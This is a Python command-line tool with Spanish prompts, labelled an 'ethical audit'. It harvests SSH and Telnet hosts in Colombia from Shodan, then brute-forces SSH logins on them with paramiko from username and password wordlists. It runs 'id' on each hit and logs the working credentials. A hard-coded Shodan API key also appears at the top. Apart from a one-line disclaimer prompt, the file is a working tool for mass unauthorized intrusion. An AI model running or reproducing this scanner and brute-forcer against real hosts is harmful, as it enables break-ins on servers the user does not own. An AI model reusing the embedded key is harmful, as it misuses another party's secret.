import shodan
import paramiko
import socket
import threading
from queue import Queue
import time
import os

API_KEY = "ylDwTurnigxLMIqvyQELiovHFQNPKkA8"  # Reemplaza con tu API Key válida
MAX_THREADS = 10
stop_event = threading.Event()
task_queue = Queue()
working_threads = 0


def advertencia():
    print("⚠️  Esta herramienta es solo para fines educativos y pruebas controladas.")
    print("El uso no autorizado de sistemas informáticos es ilegal.")
    resp = input("¿Deseas continuar con la auditoría ética? (s/n): ").strip().lower()
    if resp != 's':
        print("Operación cancelada.")
        exit()


def verificar_puerto_abierto(ip, puerto, timeout=3):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            return s.connect_ex((ip, puerto)) == 0
    except:
        return False


def probar_credenciales(ip, port, user, pwd):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, port=port, username=user, password=pwd, timeout=10, banner_timeout=10, auth_timeout=10)
        stdin, stdout, stderr = ssh.exec_command('id', timeout=5)
        output = stdout.read().decode().strip()
        mensaje = f"[✔] ACCESO EXITOSO - {ip}:{port} - {user}:{pwd}\n    Resultado de 'id': {output}\n\n"
        print(mensaje)
        with open("vulnerabilidades_detectadas.txt", "a") as f:
            f.write(mensaje)
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except (paramiko.SSHException, socket.timeout, Exception) as e:
        error_msg = f"[-] Error en {ip}:{port} con {user}:{pwd} -> {str(e)}\n"
        print(error_msg)
        with open("errores_conexion.txt", "a") as f:
            f.write(error_msg)
        return False


def worker():
    global working_threads
    while not task_queue.empty() and not stop_event.is_set():
        try:
            ip_port, user, pwd = task_queue.get_nowait()
        except:
            break
        ip, port = ip_port.split(":")
        port = int(port)
        if not verificar_puerto_abierto(ip, port):
            print(f"[-] Puerto cerrado: {ip}:{port}")
            task_queue.task_done()
            continue
        probar_credenciales(ip, port, user, pwd)
        task_queue.task_done()
    working_threads -= 1


def iniciar_auditoria(ip_file, user_file, pass_file):
    global working_threads
    try:
        with open(ip_file) as f:
            ip_lines = [line.strip() for line in f if line.strip()]
        with open(user_file) as f:
            users = [line.strip() for line in f if line.strip()]
        with open(pass_file) as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[-] Error al cargar archivos: {e}")
        return

    open("vulnerabilidades_detectadas.txt", "w").close()
    open("errores_conexion.txt", "w").close()

    for ip_port in ip_lines:
        if ':' not in ip_port:
            continue
        for user in users:
            for pwd in passwords:
                task_queue.put((ip_port, user, pwd))

    working_threads = min(MAX_THREADS, task_queue.qsize())
    for _ in range(working_threads):
        threading.Thread(target=worker, daemon=True).start()

    while not task_queue.empty() or working_threads > 0:
        time.sleep(1)

    print("[✔] Auditoría SSH finalizada.")


def buscar_shodan():
    if API_KEY == "TU_API_KEY_DE_SHODAN":
        print("[-] Debes configurar una clave válida de Shodan.")
        return

    try:
        api = shodan.Shodan(API_KEY)
        paises_latam = ['CO']
        ssh_ips, telnet_ips = [], []

        for pais in paises_latam:
            print(f"[*] Buscando dispositivos en {pais}...")
            puertos_ssh = [22, 2222, 22222, 2200]
            for puerto in puertos_ssh:
                try:
                    resultados = api.search(f'port:{puerto} country:{pais}', limit=1000)
                    for s in resultados['matches']:
                        ip = s['ip_str']
                        ssh_ips.append(f"{ip}:{puerto}")
                        print(f"[+] SSH - {ip}:{puerto}")
                except Exception as e:
                    print(f"[-] Error puerto {puerto}: {str(e)}")

            try:
                resultados = api.search(f'port:23 country:{pais}', limit=1000)
                for s in resultados['matches']:
                    ip = s['ip_str']
                    telnet_ips.append(f"{ip}:23")
                    print(f"[+] Telnet - {ip}:23")
            except Exception as e:
                print(f"[-] Error Telnet en {pais}: {str(e)}")

        with open("ips_ssh.txt", "w") as f:
            f.write("\n".join(ssh_ips))
        with open("ips_telnet.txt", "w") as f:
            f.write("\n".join(telnet_ips))

        print(f"[✔] Búsqueda completada. SSH: {len(ssh_ips)}, Telnet: {len(telnet_ips)}")

    except Exception as e:
        print(f"[-] Error en búsqueda Shodan: {str(e)}")


def main():
    advertencia()
    while True:
        print("\n--- Auditoría SSH/Telnet CLI ---")
        print("1. Buscar IPs en Shodan")
        print("2. Iniciar Auditoría SSH")
        print("3. Salir")
        opcion = input("Seleccione una opción: ").strip()

        if opcion == '1':
            buscar_shodan()
        elif opcion == '2':
            ip_file = input("Archivo de IPs (formato IP:puerto): ").strip()
            user_file = input("Archivo de usuarios: ").strip()
            pass_file = input("Archivo de contraseñas: ").strip()
            if not os.path.exists(ip_file) or not os.path.exists(user_file) or not os.path.exists(pass_file):
                print("[-] Verifica que todos los archivos existan.")
                continue
            iniciar_auditoria(ip_file, user_file, pass_file)
        elif opcion == '3':
            print("Saliendo...")
            break
        else:
            print("Opción inválida.")


if __name__ == "__main__":
    main()
